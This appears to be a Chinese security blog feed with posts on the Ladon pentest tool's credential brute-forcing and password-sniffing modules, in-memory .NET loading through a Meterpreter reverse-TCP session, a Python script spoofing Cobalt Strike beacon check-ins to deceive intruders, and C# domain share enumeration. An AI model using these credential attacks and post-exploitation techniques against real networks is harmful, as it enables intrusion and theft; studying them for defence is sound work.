    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
    <url>/p/56393.html</url>
    <content><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
<h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p>
<h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table>
<thead>
<tr>
<th>动作</th>
<th>模块</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>新增</td>
<td>LdapScan</td>
<td>AD域密码爆破:基于Ldap协议爆破Windows密码</td>
</tr>
<tr>
<td>新增</td>
<td>FtpSniffer/SnifferFtp</td>
<td>Ftp密码嗅探(无需WinPcap)</td>
</tr>
<tr>
<td>新增</td>
<td>HttpSniffer/SnifferHTTP</td>
<td>HTTP密码嗅探(无需WinPcap)</td>
</tr>
<tr>
<td>新增</td>
<td>GetCmdLine/CmdLine</td>
<td>获取进程命令行参数/可指定进程</td>
</tr>
<tr>
<td>新增</td>
<td>GetInfo</td>
<td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td>
</tr>
<tr>
<td>新增</td>
<td>GetInfo2</td>
<td>包含GetInfo &amp; Wmi获取信息</td>
</tr>
<tr>
<td>新增</td>
<td>Sniffer</td>
<td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td>
</tr>
<tr>
<td>新增</td>
<td>EnumIIS/IisWeb</td>
<td>获取IIS站点、路径、帐号、密码</td>
</tr>
<tr>
<td>新增</td>
<td>EnumProcess/ProcessList/tasklist</td>
<td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td>
</tr>
<tr>
<td>更新</td>
<td>HttpDownload/wget</td>
<td>HTTP下载命令简化也可使用wget</td>
</tr>
<tr>
<td>更新</td>
<td>OsScan</td>
<td>扫描速度优化(某项目批量C段不再卡死)</td>
</tr>
<tr>
<td>更新</td>
<td>WmiScan</td>
<td>135端口关闭或RPC不可用停止爆破</td>
</tr>
<tr>
<td>更新</td>
<td>SmbScan</td>
<td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td>
</tr>
<tr>
<td>移除</td>
<td>IPCScan</td>
<td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td>
</tr>
<tr>
<td>更新</td>
<td>所有模块</td>
<td>所有功能模块参数忽略大小写</td>
</tr>
</tbody></table>
<h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p>
<h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p>
<h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p>
<h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p>
<p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p>
<p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p>
<h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p>
<h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p>
<h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p>
<h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p>
<h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>密码</category>
        <category>嗅探</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Sniffer</tag>
        <tag>FtpSniffer</tag>
        <tag>HttpSniffer</tag>
        <tag>IIS</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit/PowerShell内存加载执行.NET</title>
    <url>/p/57438.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>

<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>

<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
<ul>
<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
<li>FullyQualifiedErrorId : DotNetMethodException</li>
</ul>
</li>
</ul>
<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
]]></content>
      <categories>
        <category>Metasploit</category>
        <category>.NET</category>
        <category>PowerShell</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>PowerShell</tag>
        <tag>.NET</tag>
        <tag>C#</tag>
        <tag>MSF</tag>
        <tag>meterpreter</tag>
      </tags>
  </entry>
  <entry>
    <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
    <url>/p/40523.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
<h3 id="远控术语"><a href="#远控术语" class="headerlink" title="远控术语"></a>远控术语</h3><p>Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）<br>Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦<br>Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？<br>中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB</p>
<p>就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控<br>如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因<br>CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也<br>一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP</p>
<p>C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构<br>B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问<br>RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。<br>C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫<br>这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2</p>
<p>当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉<br>看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧<br>以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能<br>而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊<br>以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了<br>多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控</p>
<p>PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端</p>
<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）<br>比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？<br>当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。<br>当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪<br>为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行<br>HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。</p>
<p>就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。<br>而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。<br>你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)<br>HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样<br>本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。<br>所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马<br>最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等</p>
<h3 id="CS心跳包"><a href="#CS心跳包" class="headerlink" title="CS心跳包"></a>CS心跳包</h3><p>一般在设计远控时，我们都会对机器进行标记，比如上线特征为A<br>A对应信息已保存在本地数据库，因此想要确认机器是否还在控<br>我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包<br>而没实战过的人是每次都发送目标信息，这样很容易被目标发现</p>
<p>下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下<br>CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里<br>非正常cookie写法，一段很长的加密数据，可以止来判断是否中招</p>
<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat1.PNG"></p>
<h3 id="上线验证"><a href="#上线验证" class="headerlink" title="上线验证"></a>上线验证</h3><p>使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级<br>区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat2.PNG"></p>
<p>运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat3.gif"></p>
<h3 id="欺骗入侵者"><a href="#欺骗入侵者" class="headerlink" title="欺骗入侵者"></a>欺骗入侵者</h3><p>假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃<br>他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩<br>还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cscheat</span><span class="params">()</span>:</span></span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	opener.addheaders.append((<span class="string">'Cookie'</span>, <span class="string">'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM='</span>))</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.1.102:800/dpixel"</span>)</span><br><span class="line">	content = res.read()</span><br><span class="line">	<span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">	print(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat4.gif"></p>
<h3 id="读取CMD指令"><a href="#读取CMD指令" class="headerlink" title="读取CMD指令"></a>读取CMD指令</h3><p>当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....</span><br><span class="line"></span><br><span class="line">5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e6574</span><br><span class="line">2075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971</span><br></pre></td></tr></table></figure>

<p>测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A<br>所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令</p>
<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat5.PNG"></p>
<h3 id="返回CMD结果"><a href="#返回CMD结果" class="headerlink" title="返回CMD结果"></a>返回CMD结果</h3><p>将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /submit.php?id=60871 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Host: 192.168.1.102:800</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">...@...</span><br><span class="line">........win-60a3b595b7m\k8gege</span><br><span class="line">................0=W1..LGCN..</span><br></pre></td></tr></table></figure>

<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者<br>有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制<br>也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果<br>即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈</p>
<p>PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux<br>目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。<br>而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端<br>不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦<br>因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时<br>其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。<br>当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。</p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>Cobalt Strike</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>利用DirectoryEntry获取域内计算机以及共享资源</title>
    <url>/p/54132.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：<br>protocol://servername:port number/distinguished name<br>此语句的第一部分定义了访问将使用的协议，如<br>LDAP: (Lightweight Directory Access Protocol)<br>IIS: (提供IIS元数据来读及配置Internet Infomation Server)<br>WinNT: (提供在非常有限的性能下对Windows NT域的访问)<br>NDS: (提供对Novell Directory Service的访问)<br>等等（详细信息清参考MSDN）。 </p>
<p>因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。</p>
<h3 id="C-实现代码"><a href="#C-实现代码" class="headerlink" title="C#实现代码"></a>C#实现代码</h3><p>以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string strDomain;</span><br><span class="line">string strComputer;</span><br><span class="line">string strShare;</span><br><span class="line">Console.WriteLine(&quot;Load EnumShare&quot;);</span><br><span class="line"></span><br><span class="line">DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);</span><br><span class="line">foreach (DirectoryEntry Domain in root.Children)</span><br><span class="line">&#123;</span><br><span class="line">    strDomain &#x3D; Domain.Name;</span><br><span class="line">    Console.WriteLine(&quot;Domain: &quot; + strDomain);</span><br><span class="line">    foreach (DirectoryEntry Computer in Domain.Children)</span><br><span class="line">    &#123;</span><br><span class="line">        if (Computer.SchemaClassName.Equals(&quot;Computer&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            strComputer &#x3D; Computer.Name;</span><br><span class="line">            ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;);</span><br><span class="line">            foreach (ManagementObject share in searcher.Get())</span><br><span class="line">            &#123;</span><br><span class="line">                strShare &#x3D; share[&quot;Name&quot;].ToString();</span><br><span class="line">                Console.WriteLine(strComputer + &quot;\\&quot; + strShare);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ladon EnumShare<br>因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exe/EnumShare.PNG"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>.NET</category>
        <category>主机发现</category>
        <category>源码</category>
        <category>内网渗透</category>
        <category>信息收集</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
    <url>/p/42879.html</url>
    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
